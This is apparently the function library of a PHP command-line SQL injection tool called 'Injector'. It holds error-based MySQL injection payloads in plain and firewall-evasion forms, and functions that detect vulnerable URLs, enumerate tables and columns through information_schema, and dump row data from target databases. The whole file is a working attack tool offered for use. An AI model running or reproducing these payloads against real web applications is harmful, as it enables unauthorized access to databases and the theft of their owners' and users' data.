<?php
function showHeader()
{
	echo "\r\n";
	echo " _____       _           _             \r\n";
	echo "|_   _|     (_)         | |            \r\n";
	echo "  | |  _ __  _  ___  ___| |_ ___  _ __ \r\n";
	echo "  | | | '_ \| |/ _ \/ __| __/ _ \| '__|\r\n";
	echo " _| |_| | | | |  __/ (__| || (_) | |   \r\n";
	echo "|_____|_| |_| |\___|\___|\__\___/|_|   \r\n";
	echo "           _/ |                        \r\n";
	echo "          |__/                         \r\n";
	echo "		     ____           ____                         \r\n";
	echo "		    | __ ) _   _   / ___|_ __ _____      ___ __ \r\n ";
	echo "		    |  _ \| | | | | |   | '__/ _ \ \ /\ / / '_ \ \r\n";
	echo "		    | |_) | |_| | | |___| | | (_) \ V  V /| | | |\r\n";
	echo "		    |____/ \__, |  \____|_|  \___/ \_/\_/ |_| |_|\r\n";
	echo "		 	    |___/                                    \r\n";
}

function strToHex($str)
{
    $hex = '';

    for($i =0; $i < strlen($str);$i++)
    {
        $hex .= dechex(ord($str[$i]));
    }

    return "0x".$hex;
}

function isValidMode($mode)
{
	$array_mode = array("error_based");
	if(in_array($mode, $array_mode))
	{
		$isValid = 1;
	}
	else
	{
		$isValid = 0;
		die("The selected mode is not valid, please read the help menu [{$_SERVER['SCRIPT_FILENAME']} --help].\n");
	}
	return $isValid;
}
function getHttpCode($url)
{
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_NOBODY, true);
    curl_exec($ch);

    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);

    curl_close($ch);

    return $http_code;
}

function isVulnerable($url)
{
	global $pattern;
	
	$content_version = @file_get_contents($url.urlencode(" or 1 group by concat(version(),floor(rand(0)*2)) having min(0) or 1--"));
	
	if(preg_match("#$pattern#i", $content_version))
	{
		$isVuln = 1;
		
	}
	else 
	{
		$isVuln = 0;
	}

	return $isVuln;
}
function isVulnerableString($url)
{
	global $pattern;

	$isVuln = NULL;
	$request = $url."'%20or%201%20group%20by%20concat(version(),floor(rand(0)*2))%20having%20min(0)%20or%201--+-";
	$content_version = @file_get_contents($request);

	if(preg_match("#$pattern#i", $content_version))
	{
		$isVuln = 1;	
	}
	else 
	{
		$isVuln = 0;
	}

	return array($isVuln, $request);
}

function isVulnerableWaf($url)
{
	global $pattern;

	$isVuln = NULL;
	$content_version = @file_get_contents($url."/**/or/**/1/**/group/**/by/**/*!30000concat*//**/(version(),floor(rand(0)*2))/**//*!30000having*//**/min(0)/**/or/**/1--");
	
	if(preg_match("#$pattern#i", $content_version))
	{
		$isVuln = 1;	
	}
	else 
	{
		$isVuln = 0;
	}

	return $isVuln;
}
function isVulnerableStringWaf($url)
{
	global $pattern;

	$isVuln = NULL;
	$content_version = @file_get_contents($url."'/**/or/**/1/**/group/**/by/**//*!30000concat*//**/(version(),floor(rand(0)*2))/**//*!30000having*//**/min(0)/**/or/**/1--+-");
	
	if(preg_match("#$pattern#i", $content_version))
	{
		$isVuln = 1;	
	}
	else 
	{
		$isVuln = 0;
	}

	return $isVuln;
}

function getTables($url,$type)
{
	global $array_table;
	global $array_column;
	global $pattern;

	$i=0;

	if($type == 'regular')
	{
		do
		{
			$content_error = @file_get_contents($url.urlencode(" or 1 group by concat((select table_name from information_schema.tables where table_schema= database() limit $i,1),0x3a2d454e44,floor(rand(0)*2)) having min(0) or 1--"));
			
			if(!preg_match("#:-END1#", $content_error))
			{
				echo "\r\n[+]Total tables count ($i)\r\n\r\n";
				break;
			}

			$table = explode("Duplicate entry '",$content_error);
			$pos = strpos($table[1],':-END1');
			$table[1] = substr($table[1],0,$pos);
			
			echo "[+]Table found : ".$table[1]."\r\n";
			array_push($array_table, $table[1]);

			$i++;

		} while (preg_match("#$pattern#", $content_error));
	}
	elseif($type == 'string')
	{
		do
		{
			$content_error = @file_get_contents($url."'%20or%201%20group%20by%20concat((select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%20$i,1),0x3a2d454e44,floor(rand(0)*2))%20having%20min(0)%20or%201--+-");
			
			if(!preg_match("#:-END1#", $content_error))
			{
				echo "\r\n[+]Total tables count ($i)\r\n\r\n";
				break;
			}
			
			$table = explode("Duplicate entry '",$content_error);
			$pos = strpos($table[1],':-END1');
			$table[1] = substr($table[1],0,$pos);
			
			echo "[+]Table found : ".$table[1]."\r\n";
			array_push($array_table, $table[1]);

			$i++;

		} while (preg_match("#$pattern#", $content_error));
	}
	elseif($type == 'regularWAF')
	{
		do
		{
			$content_error = @file_get_contents($url."/**/or/**/1/**/group/**/by/**/concat((/*!30000select*//**//*!table_name*//**/from/**//*!information_schema*/.tables/**//*!where*//**//*!table_schema*/=/**/database()/**/limit/**/$i,1),0x3a2d454e44,floor(rand(0)*2))/**//*!30000having*//**/min(0)/**/or/**/1--");
			
			if(!preg_match("#:-END1#", $content_error))
			{
				echo "\r\n[+]Total tables count ($i)\r\n\r\n";
				break;
			}

			$table = explode("Duplicate entry '",$content_error);
			$pos = strpos($table[1],':-END1');
			$table[1] = substr($table[1],0,$pos);
			
			echo "[+]Table found : ".$table[1]."\r\n";
			array_push($array_table, $table[1]);

			$i++;

		} while (preg_match("#$pattern#", $content_error));
	}
	elseif($type == 'stringWAF')
	{
		do
		{
			$content_error = @file_get_contents($url."'/**/or/**/1/**/group/**/by/**/concat((/*!30000select*//**//*!table_name*//**/from/**//*!information_schema*/.tables/**//*!where*//**//*!table_schema*/=/**/database()/**/limit/**/$i,1),0x3a2d454e44,floor(rand(0)*2))/**//*!30000having*//**/min(0)/**/or/**/1--+-");
			
			if(!preg_match("#:-END1#", $content_error))
			{
				echo "\r\n[+]Total tables count ($i)\r\n\r\n";
				break;
			}

			$table = explode("Duplicate entry '",$content_error);
			$pos = strpos($table[1],':-END1');
			$table[1] = substr($table[1],0,$pos);
			
			echo "[+]Table found : ".$table[1]."\r\n";
			array_push($array_table, $table[1]);

			$i++;

		} while (preg_match("#$pattern#", $content_error));
	}
	else
	{
		die("[!]This mode of injection is not recognized, mode given `$type`, script aborted\r\n");
	}
}
function getTargetTable()
{
	global $array_table;

	a:

	echo "[?]Enter the target table : ";

	$table = trim(fgets(STDIN));

	if(empty($table) OR !in_array($table,$array_table))
	{
	    goto a;
	}

	return $table;
}

function getColumns($table,$type)
{
	global $array_column;
	global $pattern;
	global $hex;
	global $url;

	$i = 0;
	
	if($type == 'regular')
	{
		do
		{
			$content_error = file_get_contents($url.urlencode(" or 1 group by concat((select column_name from information_schema.columns where table_name = $hex  limit $i,1),0x3a2d454e44,floor(rand(0)*2)) having min(0) or 1--"));
			
			if(!preg_match("#:-END1#", $content_error))
			{
				echo "\r\n[+]Total columns count ($i)\r\n\r\n";
				break;
			}

			$column = explode("Duplicate entry '",$content_error);
			$pos = strpos($column[1],':-END1');
			$column[1] = substr($column[1],0,$pos);
			
			echo "[+]Column found : ".$column[1]."\r\n";
			array_push($array_column, $column[1]);

			$i++;

		} while (preg_match("#$pattern#", $content_error));
	}
	elseif($type == 'string')
	{
		do
		{
			$content_error = file_get_contents($url."'%20or%201%20group%20by%20concat((select%20column_name%20from%20information_schema.columns%20where%20table_name%20=%20$hex%20limit%20$i,1),0x3a2d454e44,floor(rand(0)*2))%20having%20min(0)%20or%201--+-");
			
			if(!preg_match("#:-END1#", $content_error))
			{
				echo "\r\n[+]Total columns count ($i)\r\n\r\n";
				break;
			}

			$column = explode("Duplicate entry '",$content_error);
			$pos = strpos($column[1],':-END1');
			$column[1] = substr($column[1],0,$pos);
			
			echo "[+]Column found : ".$column[1]."\r\n";
			array_push($array_column, $column[1]);

			$i++;

		} while (preg_match("#$pattern#", $content_error));
	}
	elseif($type == 'regularWAF')
	{
		do
		{
			$content_error = file_get_contents($url."/**/or/**/1/**/group/**/by/**/concat((/*!30000select*//**//*!column_name*//**/from/**//*!information_schema*/.columns/**//*!where*//**//*!table_name*/=/**/$hex/**/limit/**/$i,1),0x3a2d454e44,floor(rand(0)*2))/**//*!30000having*//**/min(0)/**/or/**/1--");
			
			if(!preg_match("#:-END1#", $content_error))
			{
				echo "\r\n[+]Total columns count ($i)\r\n\r\n";
				break;
			}

			$column = explode("Duplicate entry '",$content_error);
			$pos = strpos($column[1],':-END1');
			$column[1] = substr($column[1],0,$pos);
			
			echo "[+]Column found : ".$column[1]."\r\n";
			array_push($array_column, $column[1]);

			$i++;

		} while (preg_match("#$pattern#", $content_error));
	}
	elseif($type == 'stringWAF')
	{
		do
		{
			$content_error = file_get_contents($url."'/**/or/**/1/**/group/**/by/**/concat((/*!30000select*//**//*!column_name*//**/from/**//*!information_schema*/.columns/**//*!where*//**//*!table_name*/=/**/$hex/**/limit/**/$i,1),0x3a2d454e44,floor(rand(0)*2))/**//*!30000having*//**/min(0)/**/or/**/1--+-");
			
			if(!preg_match("#:-END1#", $content_error))
			{
				echo "\r\n[+]Total columns count ($i)\r\n\r\n";
				break;
			}

			$column = explode("Duplicate entry '",$content_error);
			$pos = strpos($column[1],':-END1');
			$column[1] = substr($column[1],0,$pos);
			
			echo "[+]Column found : ".$column[1]."\r\n";
			array_push($array_column, $column[1]);

			$i++;

		} while (preg_match("#$pattern#", $content_error));
	}
	else
	{
		die("[!]This mode of injection is not recognized, mode given `$type`, script aborted\r\n");
	}
}

function getTargetColumns()
{
	global $array_column;

	b:

	echo "[?]Enter the target column (each column must be splitted by ,) : ";

	$raw = trim(fgets(STDIN));
	$raws0 =$raw;
	$raws = explode(",",$raw);

	for($x = 0; $x < count($raws);$x++)
	{
		if(empty($raw) OR !in_array($raws[$x],$array_column))
		{
			goto b;
		}
	}
	
	$query = "";

	for($i = 0;$i < count($raws);$i++)
	{
	    $query .= "0x7e,".$raws[$i].",";
	}

	$query  = substr($query,0,-1);
	
	return array ($query, $raws0);
}

function getData($type)
{
	global $url;
	global $pattern;
	global $table;
	global $query;

	$i=0;

	if($type == 'regular')
	{
		do {
			$content_error = file_get_contents($url.urlencode(" or 1 group by concat((select substr(concat($query),1,150) from $table limit $i,1),0x3a2d45,floor(rand(0)*2)) having min(0) or 1--"));

			if(!preg_match("#:-E#", $content_error))
			{
				echo "\r\n[+]Total raws count ($i)\r\n";
				break;
			}

			$data = explode("Duplicate entry '",$content_error);
			$pos = strpos($data[1],':-E');
			$data[1] = substr($data[1],0,$pos);
			$data[1] = str_replace("~", " # ", $data[1]);

			echo "[+]Data found :".$data[1]."\r\n";

			$i++;

		}while(preg_match("#$pattern#",$content_error));
	}
	elseif($type == 'string')
	{
		do {
			$content_error = file_get_contents($url."'%20or%201%20group%20by%20concat((select%20distinct%20substr(concat($query),1,150)%20from%20$table%20limit%20$i,1),0x3a2d45,floor(rand(0)*2))%20having%20min(0)%20or%201--+-");

			if(!preg_match("#:-E#", $content_error))
			{
				echo "\r\n[+]Total raws count ($i)\r\n";
				break;
			}

			$data = explode("Duplicate entry '",$content_error);
			$pos = strpos($data[1],':-E');
			$data[1] = substr($data[1],0,$pos);
			$data[1] = str_replace("~", " # ", $data[1]);
			
			echo "[+]Data found :".$data[1]."\r\n";

			$i++;

		}while(preg_match("#$pattern#",$content_error));  
	}
	elseif($type == 'regularWAF')
	{
		do 
		{
			$content_error = file_get_contents($url."/**/or/**/1/**/group/**/by/**/concat((/*!30000select*//**//*!30000distinct*//**/concat($query)/**/from/**/$table/**/limit/**/$i,1),0x3a2d45,floor(rand(0)*2))/**//*!30000having*//**/min(0)/**/or/**/1--");  
			
			if(!preg_match("#:-E#", $content_error))
			{
				echo "\r\n[+]Total raws count ($i)\r\n";
				break;
			}

			$data = explode("Duplicate entry '",$content_error);
			$pos = strpos($data[1],':-E');
			$data[1] = substr($data[1],0,$pos);
			$data[1] = str_replace("~", " # ", $data[1]);

			echo "[+]Data found :".$data[1]."\r\n";

			$i++;

		}while(preg_match("#$pattern#",$content_error));  
	}
	elseif($type == 'stringWAF')
	{
		do 
		{
			$content_error = file_get_contents($url."'/**/or/**/1/**/group/**/by/**/concat((/*!30000select*//**//*!30000distinct*//**/concat($query)/**/from/**/$table/**/limit/**/$i,1),0x3a2d45,floor(rand(0)*2))/**//*!30000having*//**/min(0)/**/or/**/1--+-");  
			if(!preg_match("#:-E#", $content_error))
			{
				echo "\r\n[+]Total raws count ($i)\r\n";
				break;
			}

			$data = explode("Duplicate entry '",$content_error);
			$pos = strpos($data[1],':-E');
			$data[1] = substr($data[1],0,$pos);
			$data[1] = str_replace("~", " # ", $data[1]);

			echo "[+]Data found :".$data[1]."\r\n";

			$i++;

		}while(preg_match("#$pattern#",$content_error));  
	}
	else
	{
		die("[!]This mode of injection is not recognized, mode given `$type`, script aborted\r\n");
	}
}
?>
